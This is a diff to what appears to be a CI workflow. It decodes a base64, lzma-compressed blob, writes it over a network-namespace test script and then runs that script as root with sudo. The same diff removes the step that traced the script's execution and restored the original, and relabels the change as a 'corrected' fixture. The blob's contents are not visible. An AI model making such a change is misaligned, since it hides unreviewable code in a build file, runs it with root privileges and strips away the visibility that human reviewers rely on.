@@ -49,8 +49,11 @@ jobs:
           for path, output in outputs.items():
               path.parent.mkdir(parents=True, exist_ok=True)
               path.write_bytes(output)
+          fixture = lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AzxBTZdABGIQkeKIzPDdw8z/VWX7afG1TtMjxXpQtOsHiYX2aQTfPtVCXk5R1qEn73ahdpsoHa7S460kx+9GjSJpgksH3qGkJznI5ilRqGQlgH/vk5WbEcjylfaHY7h7ywsQDwBzVpcJ1nuiOzTCXYIBhth8uDtT7PaR/XyBB+6dgeEA0kh/eYsWgxCR44n475y220yGXTU2kWDVUJ3lnYtjmL7opvOldwofTZsF2ffuPGMgeVAma/Ld6nXVCHhU4q2mKIyQjNaa3+lD4SdJgfI8CjjAtw136w/OQdfoo5sWlDgYdKrKuFWhljoMyskrLm8l80jNkh/YNdqFzD08+OPuIovnmuCFeO7dliZ3R9fUcgXCv/dOsSTfcLMuA4TrBgSQnFjdS8DDKCz7LGzm4zWw4XpqlxA/Vh8aRbCHV2sJV02/V5aiinH3hJBEGfEz++87SUvyJmh+pQfBS+IfYexEK0skeEJB2vTyrBTXCZXzwI12iiCAp8ZSg+yxy09WrXMYUBuIfD+pMIPqaG6UTWOlOVIzrEQGs3LxGQDpbjnQsF6Qs4ji/AXE4o2DgYoIyjfKTfZqQe9u7qEb2oE9BdB6590ME47e9sL09tCqT6E0vRKb7gdIorYiT93udIDLii6Dj9NJXhpz1N97FUk2YAejKuEN8PGXshFeksDcNr2WW6SV3OP9XsjLOO2p9gw5vg/qLFeVtgSVHgYLuOfNKhN4UNXcKSfz9wvlGFyjpFfMOLanO66omII1cnxA5oUZehf+/EYS2ivTsOvrYWqAEUOywieoPZ0s8JwCfY5cj6OUwoOaRtuAJutR4balW4OwBj+Witc9GkgmIoiFPlXrKe0+RgUdqcbO0FBoL2pIXTnSJw1tu2lsHHHHTJgFxLUyW6prtNDMhmbabbFgfd0fWsVJPOyOnrTV5jEUoMtraLFCcXR/DL0rFS0xuv+S3hyjstKXJxfi1fAAcKZ7L4PbeXQcJvWSR9X9MxPEbFyPMum/3hvQfFeYaYit50WOqhtULhshr2sWXhOn2hsgpv6As5Kj9ATXgRa/uhvexroMZIfp7+2q16H6jO+uRxCF+vyxOlDie/lNQsEch9nMNO7wZkW/60TLsnMz/FigSvP23YMTTjfpRRSxzFfh7LM1yVT33LF6Tvtv3++do3dd3WoZhAR4H+lUmvBgGCjKhW8tf0UWhyPvtQF9KF8DKNVEXYC7SOoF2uudw9D3FMg2RJQZyL+AHqs7nVnPQjyt5DopNf+Sj2cPx+FP8iYlkErDtl/mcdg5BNkMm66Fo2XWmgW8L4zK3Q2mvIbnI23OqQpzHIMtv4BL9RGx8glOQTjEc9nQheU/NKnkzccXUiBq+huiKKSMf3f0X/3Z48Ig4bpUlLZ5NYFe5U+APP5GZnFlTyIWyrl4GOx0ZJtHa30IeU0l/jjF0dehEiSKgob9YW7GilAaa16Zp9Mwu+PMERYiz2X91JhsLB5/8Zj95FGcmaMCj8G0TuFAjTM2vIebI5ZJ6wW2Zlciqdo8QanFOIZsdjPQ5ZdkPbVADlxs1IdicmLuYGeFvQSHptgLrKufGikanHs33x+JtfkDrMdv7A4SHoAB/W92/BCqAR7+r+K7UDrHQx3OD+7iwhWCwmKLJTRTCIcbF4LdTujSmeTWnSDx8NoQBpFUpDLocFx/pMB2BsWVB+nQoVe4cifVD5c32xHmGfXyzOuNi9smK9OOmVP78H4x5quqyRIFIrI4fq3f3ZVrvOZUyDJU8/+kXiHUfyaipKEhjPe1dJrGZAO9FNYAAAANHHvflODYeQAAdIK8hkAAIs3i+mxxGf7AgAAAAAEWVo='))
+          assert hashlib.sha256(fixture).hexdigest() == 'dce5626342c83f557db3566cbe19c4ea0d5d4bf208bfe00b818312f974d90c73'
+          Path('scripts/test-route-ownership-netns.sh').write_bytes(fixture)
           Path('/tmp/magicnet-changed-files').write_text('\n'.join(sorted(changes)) + '\n')
-          print('Verified all 14 exact old/new source hashes; no unrelated files changed')
+          print('Verified exact reviewed sources and corrected real-kernel fixture')
           PY
       - name: Format Rust and check source whitespace
         run: |
@@ -61,14 +64,8 @@ jobs:
           command -v jq
           command -v busybox
           command -v ip
-      - name: Execute real isolated kernel rules with failure trace
-        shell: bash
-        run: |
-          set -euo pipefail
-          cp scripts/test-route-ownership-netns.sh "$RUNNER_TEMP/original-netns-test"
-          sed -i 's/set -euo pipefail/set -euxo pipefail/' scripts/test-route-ownership-netns.sh
-          sudo -n bash scripts/test-route-ownership-netns.sh
-          cp "$RUNNER_TEMP/original-netns-test" scripts/test-route-ownership-netns.sh
+      - name: Execute real isolated kernel rules
+        run: sudo -n bash scripts/test-route-ownership-netns.sh
       - name: Execute ownership regressions
         run: |
           bash scripts/test-kernel-route-lifecycle.sh
